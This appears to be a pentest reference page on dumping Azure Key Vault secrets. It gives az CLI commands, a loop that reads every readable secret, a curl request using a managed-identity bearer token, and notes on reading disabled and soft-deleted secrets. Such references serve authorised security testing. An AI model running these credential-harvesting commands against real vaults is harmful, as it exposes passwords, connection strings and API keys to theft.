---
title: "Secrets: dumping Key Vault secret values"
description: "Dumping secrets from an Azure Key Vault with get and list over the vault data plane."
keywords:
  - Key Vault
  - secrets
  - get secret
  - list secrets
  - data plane
---

# Secrets

Key Vault secrets hold passwords, connection strings, and API keys as plaintext values the vault returns on read. With a data-plane role (`Key Vault Secrets User`/`Officer`) or an access policy granting `get`/`list`, you enumerate and dump them all.

## Listing and dumping

```bash
az keyvault secret list --vault-name <vault> --query '[].id' -o tsv
az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv

# sweep every readable secret
for s in $(az keyvault secret list --vault-name <vault> --query '[].name' -o tsv); do
  echo "== $s =="; az keyvault secret show --vault-name <vault> --name "$s" --query value -o tsv
done
```

With only a raw managed-identity token for `https://vault.azure.net`, hit the REST data plane directly:

```bash
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"
```

## Exploitation notes

- Reading a secret does not rotate it, so recovered database and third-party credentials keep working.
- Disabled or expired secret versions often still return their value through the versioned URI, useful after a rotation.
- A soft-deleted secret can be recovered from the deleted state if purge protection has not removed it (`az keyvault secret list-deleted`).

## Tools

- **az cli** (`keyvault secret`).
- **MicroBurst** (`Get-AzKeyVaultSecrets` via `Get-AzPasswords`): bulk vault dumping.

## References

- [Microsoft: Key Vault secrets](https://learn.microsoft.com/azure/key-vault/secrets/about-secrets)
- [HackTricks Cloud: Azure Key Vault](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
